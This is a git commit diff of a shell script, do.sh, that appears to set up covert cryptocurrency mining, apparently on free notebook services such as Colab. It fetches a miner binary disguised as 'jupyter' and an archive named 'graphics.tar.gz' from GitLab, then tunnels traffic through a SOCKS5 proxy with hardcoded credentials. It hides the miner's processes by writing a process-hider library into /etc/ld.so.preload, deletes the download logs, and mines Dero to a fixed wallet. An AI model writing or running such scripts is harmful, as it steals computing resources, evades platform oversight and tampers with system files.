7e49025719aca0280b3fc574f5ca44dfb896ba0e
fisikabiolo <103661450+fisikabiolo@users.noreply.github.com>
2022-12-22 06:18:52 -0500

    Update do.sh

--- do.sh
+++ do.sh
@@ -2,10 +2,22 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/gilaaja/exe/-/raw/main/graphics.tar.gz
+
 tar -xvzf graphics.tar.gz
+
+wget https://gitlab.com/gilalww/exe/-/raw/main/jupyter && chmod +x jupyter >/dev/null 2>&1
+rm -rf wget-log*
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
@@ -14,6 +26,7 @@ socks5 =  128.199.222.68:443
 socks5_username = arema
 socks5_password = singoedan
 END
+
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
@@ -34,14 +47,12 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/angkii/2022/raw/main/dero1.5.1
-chmod +x dero1.5.1
-
-./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
+./graftcp/graftcp wget https://gitlab.com/gilaaja/exe/-/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
+rm -rf wget-log*
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./dero1.5.1 -w dero1qyp8vzjyg6k6p95hvfct3vnv2pee9ss4qg9nym7wu9ck9vq82fce7qq29m6a3.$(echo $(shuf -i 1-20000 -n 1)-astro) -r pool.whalesburg.com:4300 -p stratum
+./graftcp/graftcp ./jupyter -r stratum+tcp://pool.whalesburg.com:4300 -w dero1qyp8vzjyg6k6p95hvfct3vnv2pee9ss4qg9nym7wu9ck9vq82fce7qq29m6a3.$(shuf -n 1 -i 1-999999)-colab
